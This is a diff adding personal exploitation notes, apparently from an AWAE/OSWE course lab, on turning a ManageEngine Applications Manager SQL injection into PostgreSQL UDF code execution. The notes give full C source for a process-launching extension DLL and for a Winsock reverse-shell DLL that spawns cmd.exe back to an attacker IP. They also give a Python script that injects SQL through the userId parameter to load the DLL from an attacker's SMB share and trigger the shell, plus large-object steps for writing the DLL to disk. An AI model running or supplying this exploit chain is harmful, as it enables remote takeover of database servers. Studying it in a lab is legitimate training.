@@ -514,4 +514,373 @@ then created msfvenom reverse payload.
  Then the combined one line .vbs file content was urlencoded usind burp. That urlencoded content was used in replacing ENCODED_PAYLOAD.
  
  
+ 1
+(MicroSoft, 2019), https://docs.microsoft.com/en-us/sysinternals/downloads/procmon ↩︎
+
+PostgreSQL Extensions
+
+```
+CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;
+```
+Listing 40 - Basic SQL syntax to create a function from a local library
+
+However, there is an important restriction that we need to keep in mind. The compiled extension we want to load must define an appropriate Postgres structure (magic block) to ensure that a dynamically library file is not loaded into an incompatible server.
+
+```
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS 'C:\Windows\System32\kernel32.dll', 'WinExec' LANGUAGE C STRICT;
+SELECT system('hostname');
+ERROR:  incompatible library "c:\Windows\System32\kernel32.dll": missing magic block
+HINT: Extension libraries are required to use the PG_MODULE_MAGIC macro.
+
+********** Error **********
+```
+Listing 41 - Attempting to load a Windows DLL.
+
+##### Build Environment
+
+The following example code can be found in the poc.c source file within the awae solution:
+```
+01: #include "postgres.h"
+02: #include <string.h>
+03: #include "fmgr.h"
+04: #include "utils/geo_decls.h"
+05: #include <stdio.h>
+06: #include "utils/builtins.h"
+07: 
+08: #ifdef PG_MODULE_MAGIC
+09: PG_MODULE_MAGIC;
+10: #endif
+11: 
+12: /* Add a prototype marked PGDLLEXPORT */
+13: PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
+14: PG_FUNCTION_INFO_V1(awae);
+15: 
+16: /* this function launches the executable passed in as the first parameter
+17: in a FOR loop bound by the second parameter that is also passed*/
+18: Datum
+19: awae(PG_FUNCTION_ARGS)
+20: {
+21: 	/* convert text pointer to C string */
+22: #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
+23: 
+24:     /* retrieve the second argument that is passed to the function (an integer)
+25:     that will serve as our counter limit*/
+26:     int instances = PG_GETARG_INT32(1);
+27: 
+28:     for (int c = 0; c < instances; c++) {
+29:         /*launch the process passed in the first parameter*/
+30:         ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
+31:     }
+32: 	PG_RETURN_VOID();
+33: }
+```
+Listing 42 - Sample code to get you started
+
+
+ Build > Build Solution in Visual Studio.
+```
+------ Build started: Project: awae, Configuration: Release Win32 ------
+   Creating library C:\Users\Administrator\source\repos\awae\Release\awae.lib and object C:\Users\Administrator\source\repos\awae\Release\awae.exp
+Generating code
+Finished generating code
+All 3 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
+rs.vcxproj -> C:\Users\Administrator\source\repos\awae\Release\awae.dll
+Done building project "rs.vcxproj".
+========== Rebuild All: 1 succeeded, 0 failed, 0 skipped ==========
+```
+Listing 43 - Building the new extension
+
+Testing the Extension
+In order to test our newly-built extension, we need to first create a UDF. We can look back on Listing 40 to remind ourselves how to create a custom function in PostgreSQL.
+
+For example, the following queries will create and run a UDF called test, bound to the awae function exported by our custom DLL. Note that we have moved the DLL file to the root of the C drive for easier command writing.
+```
+amdb# \df test
+
+create or replace function test(text, integer) returns void as $$C:\awae.dll$$, $$awae$$ language C strict;
+SELECT test($$calc.exe$$, 3);
+```
+Listing 44 - The code to load the extension and run the test function
+
+Checking for calc.exe :
+```
+tasklist | findstr /i calc
+taskkill /f /IM calc.exe
+```
+
+```
+net stop "Applications Manager"
+
+del c:\awae.dll
+
+net start "Applications Manager"
+
+DROP FUNCTION test(text, integer);
+
+\df test
+
+```
+##### Loading the Extension from a Remote Location
+
+```
+kali@kali:~$ mkdir /home/kali/awae
+
+kali@kali:~$ sudo impacket-smbserver awae /home/kali/awae/
+[sudo] password for kali: 
+Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+Listing 49 - Starting the Samba service with a simple configuration file to test remote DLL loading
+
+
+ Once the Samba service is running, we can create a new Postgres UDF and point it to the DLL file hosted on the network share.
+```
+CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.119.120\awae\awae.dll$$, $$awae$$ LANGUAGE C STRICT;
+SELECT remote_test($$calc.exe$$, 3);
+```
+Listing 50 - Creating a UDF from a network share. 192.168.119.120 is the Kali attacker IP address.
+
+##### UDF Reverse shell
+
+└─$ cat rev_shell.c   
+
+```
+
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include "postgres.h"
+#include <string.h>
+#include "fmgr.h"
+#include "utils/geo_decls.h"
+#include <stdio.h>
+#include <winsock2.h>
+#include "utils/builtins.h"
+#pragma comment(lib, "ws2_32")
+
+#ifdef PG_MODULE_MAGIC
+PG_MODULE_MAGIC;
+#endif
+
+/* Add a prototype marked PGDLLEXPORT */
+PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
+PG_FUNCTION_INFO_V1(connect_back);
+
+WSADATA wsaData;
+SOCKET s1;
+struct sockaddr_in hax;
+char ip_addr[16];
+STARTUPINFO sui;
+PROCESS_INFORMATION pi;
+
+Datum
+connect_back(PG_FUNCTION_ARGS)
+{
+
+        /* convert C string to text pointer */
+#define GET_TEXT(cstrp) \
+   DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))
+
+        /* convert text pointer to C string */
+#define GET_STR(textp) \
+  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
+
+        WSAStartup(MAKEWORD(2, 2), &wsaData);
+        s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+        hax.sin_family = AF_INET;
+        /* FIX THIS */
+        hax.sin_port = htons(PG_GETARG_INT32(1));
+        /* FIX THIS TOO*/
+        hax.sin_addr.s_addr = inet_addr(GET_STR(PG_GETARG_TEXT_P(0)));
+
+        WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+
+        memset(&sui, 0, sizeof(sui));
+        sui.cb = sizeof(sui);
+        sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;
+
+        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
+        PG_RETURN_VOID();
+}
+
+
+```
+Compile and host the dll on kali. transfer the dll using impacket smb server.
+
+``` 
+┌──(kali㉿kali)-[~/repos/web-300/scripts]
+└─$ cat me_revshell.py                                    
+import requests, sys
+requests.packages.urllib3.disable_warnings()
+
+def log(msg):
+   print (msg)
+
+def make_request(url, sql):
+   log("[*] Executing query: %s" % sql[0:80])
+   r = requests.get( url % sql, verify=False)
+   return r
+
+def create_udf_func(url):
+   log("[+] Creating function...")
+   sql = "CREATE OR REPLACE FUNCTION rev_shell(text,integer) RETURNS void AS $$\\\\192.168.45.237\\awae\\rev_shell.dll$$, $$connect_back$$ language c strict"
+   make_request(url, sql)
+
+def trigger_udf(url, ip, port):
+   log("[+] Launching reverse shell...")
+   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
+   make_request(url, sql)
+   
+if __name__ == '__main__':
+   try:
+       server = sys.argv[1].strip()
+       attacker = sys.argv[2].strip()
+       port = sys.argv[3].strip()
+   except IndexError:
+       print ("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
+       sys.exit()
+       
+   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
+   create_udf_func(sqli_url)
+   trigger_udf(sqli_url, attacker, port)
+
+```
+
+Calling the python:
+```
+python3 me_revshell.py manageengine:8443 192.168.45.237 4444
+[+] Creating function...
+[*] Executing query: CREATE OR REPLACE FUNCTION rev_shell(text,integer) RETURNS void AS $$\\192.168.4
+[+] Launching reverse shell...
+[*] Executing query: select rev_shell($$192.168.45.237$$, 4444)
+
+```
+#### PostgreSQL Large Objects
+
+First, let's try to lay out our goal and the general steps we need to take to get there. Keep in mind that all of these steps should be accomplished using our original SQL injection vulnerability.
+
+Create a large object that will hold our binary payload (our custom DLL file we created in the previous section)
+Export that large object to the remote server file system
+Create a UDF that will use the exported DLL as source
+Trigger the UDF and execute arbitrary code
+
+```
+amdb=# select lo_import('C:\\Windows\\win.ini');
+ lo_import
+-----------
+    194206
+(1 row)
+
+amdb=# \lo_list
+          Large objects
+   ID   |  Owner   | Description
+--------+----------+-------------
+ 194206 | postgres |
+(1 row)
+```
+
+```
+amdb=# select lo_import('C:\\Windows\\win.ini', 1337);
+ lo_import
+-----------
+      1337
+(1 row)
+```
+Listing 54 - A lo_import with a known loid
+
+```
+amdb=# select loid, pageno from pg_largeobject;
+ loid | pageno
+------+--------
+ 1337 |      0
+(1 row)
+```
+Listing 55 - Large objects location
+
+when large objects are imported into a PostgreSQL database, they are split into 2KB chunks, which are then stored individually in the pg_largeobject table.
+
+As the PostgreSQL manual states:
+
+The amount of data per page is defined to be LOBLKSIZE (which is currently BLCKSZ/4, or typically 2 kB).
+
+```
+amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
+ loid | pageno |           encode
+------+--------+----------------------------
+ 1337 |      0 | ; for 16-bit app support\r+
+      |        | [fonts]\r                 +
+      |        | [extensions]\r            +
+      |        | [mci extensions]\r        +
+      |        | [files]\r                 +
+      |        | [Mail]\r                  +
+      |        | MAPI=1\r                  +
+      |        |
+(1 row)
+```
+Listing 56 - The contents of the win.ini file are in a large object
+
+```
+amdb=# update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
+UPDATE 1
+amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
+ loid | pageno | encode
+------+--------+--------
+ 1337 |      0 | w00t
+(1 row)
+```
+Listing 57 - The contents of the large object are updated.
+
+```
+amdb=# select lo_export(1337, 'C:\\new_win.ini');
+ lo_export
+-----------
+         1
+(1 row)
+```
+Listing 58 - Large object export
+
+Deleting objects:
+```
+amdb=# \lo_unlink 1337
+lo_unlink 1337
+amdb=# \lo_list
+      Large objects
+ ID | Owner | Description
+----+-------+-------------
+(0 rows)
+```
+Listing 59 - Deleting large objects
+
+(The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/largeobjects.html ↩︎
+
+#### Large Object Reverse Shell
+
+Create a DLL file that will contain our malicious code
+Inject a query that creates a large object from an arbitrary remote file on disk
+Inject a query that updates page 0 of the newly created large object with the first 2KB of our DLL
+Inject queries that insert additional pages into the pg_largeobject table to contain the remainder of our DLL
+Inject a query that exports our large object (DLL) onto the remote server file system
+Inject a query that creates a PostgreSQL User Defined Function (UDF) based on our exported DLL
+Inject a query that executes our newly created UDF
+
+lo_import also creates additional metadata in other tables as well, which are necessary for the lo_export function to work properly. 
+
+we need to deal with the 2KB page boundaries. You may wonder why we don't simply put our entire payload into page 0 and export that. Sadly, that won't work. If any given page contains more than 2048 bytes of data, lo_export will fail. This is why we have to create additional pages with the same loid.
+
+Reverse shell:
+
+```
+xxd rev_shell.dll | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > rev_shell.dll.txt
+```
+
+
+```
+python3 manage_engine_sqli.py manageengine:8443 192.168.45.237 4444
+```
 
